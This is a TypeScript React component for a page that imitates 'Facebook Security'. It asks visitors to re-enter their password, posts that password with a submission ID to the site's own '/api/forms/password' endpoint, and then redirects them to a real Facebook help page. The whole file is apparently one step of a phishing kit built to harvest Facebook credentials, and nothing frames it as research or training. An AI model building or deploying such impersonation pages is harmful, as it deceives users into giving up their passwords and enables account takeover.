import { useState } from 'react';
import { useMutation } from '@tanstack/react-query';
import { Loader2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import FormInput from './FormInput';
import type { PasswordFormData } from '@shared/schema';

interface PasswordFormProps {
  submissionId: number;
  userData: any;
}

export default function PasswordForm({ submissionId, userData }: PasswordFormProps) {
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const { toast } = useToast();

  const mutation = useMutation({
    mutationFn: async (data: PasswordFormData) => {
      const response = await apiRequest('POST', '/api/forms/password', data);
      return response.json();
    },
    onSuccess: (data) => {
      if (data.success) {
        toast({
          title: "Password verified successfully",
          description: "Redirecting to help center...",
        });
        // Redirect after successful verification
        setTimeout(() => {
          window.location.href = data.redirectUrl || 'https://www.facebook.com/help/media/thank-you?rdrhc';
        }, 1000);
      } else {
        if (data.errors) {
          const passwordError = data.errors.find((error: any) => error.field === 'password');
          setError(passwordError?.message || 'Verification failed');
        }
      }
    },
    onError: (error) => {
      setError('Verification failed. Please try again.');
      toast({
        title: "Verification failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (password.length < 6) {
      setError('Password must be at least 6 characters long.');
      return;
    }

    setError('');
    mutation.mutate({ password, submissionId });
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-sm">
        {/* Logo */}
        <div className="text-center mb-6">
          <div className="w-16 h-16 mx-auto mb-4 bg-facebook-blue rounded-full flex items-center justify-center">
            <span className="text-white font-bold text-xl">f</span>
          </div>
          <h2 className="text-lg font-bold text-facebook-text">Facebook Security</h2>
        </div>

        <p className="text-sm text-facebook-secondary text-center mb-6">
          Please re-enter your password to complete the request.
        </p>

        <form onSubmit={handleSubmit}>
          <FormInput
            label="Password"
            type="password"
            name="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            error={error}
            required
            placeholder="Enter your password"
          />

          <Button
            type="submit"
            disabled={mutation.isPending}
            className="w-full bg-facebook-blue hover:bg-facebook-blue-dark text-white py-3 px-4 rounded-md font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
          >
            {mutation.isPending ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Verifying...
              </>
            ) : (
              'Submit'
            )}
          </Button>
        </form>
      </div>
    </div>
  );
}
